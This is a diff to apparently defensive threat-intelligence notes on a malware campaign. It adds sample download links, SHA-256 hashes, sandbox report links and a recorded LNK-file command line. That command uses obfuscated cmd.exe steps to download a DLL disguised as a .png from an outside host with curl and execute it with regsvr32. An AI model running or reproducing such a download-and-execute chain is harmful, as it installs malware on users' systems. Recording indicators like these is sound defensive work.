@@ -3,15 +3,22 @@
 *************************************************
 
 .url https://drive.google.com/uc?export=download&id=11K-m_G-UDVtbSUFNPxnUAreDRT2DMf0u&confirm=t
+.url https://drive.google.com/uc?export=download&id=1sGobh8C3l5SjMYKJOR9xNSQNkojY-EB2&confirm=t
 .zip 311730a296273acfbec85799b25f23b4698c8cc532ca2028a55f31c8b0686b03 - E98346
 .dll a36c0298f193030753cdadef0a7f78afb02f25244d6ef552bd4afaa4550a8254
 .dll 142d465bdbf028d9035d0bf496ff73147824535f88d1e66f7fe32c55a36301b8
 
+.zip d207a48a743c5570a16a4e577cb41752907104a2a4c46ba99ad224c650e6e1c3 - E98346
+.dll 733f62a7ae7143b691882913468a375a18fb8e5b778301db590e6a9184e92b9d
+
 *************************************************
 
 https://tria.ge/220614-v6j5ksgbfr
+https://tria.ge/reports/220622-kywhjafbc8/
 
 *************************************************
+
+C:\Windows\System32\cmd.exe /q /c echo 'U3U' && echo "ooq" && ping NP2F.com && MD "%USERPROFILE%\mX" && echo "b7G" && echo "ZZp" && curl.exe --output %USERPROFILE%\mX\kO36.png https://licentokil.com/pSdA/W.dll && regsvr32 "%USERPROFILE%\mX\kO36.png"
 
 lnk file target:
 
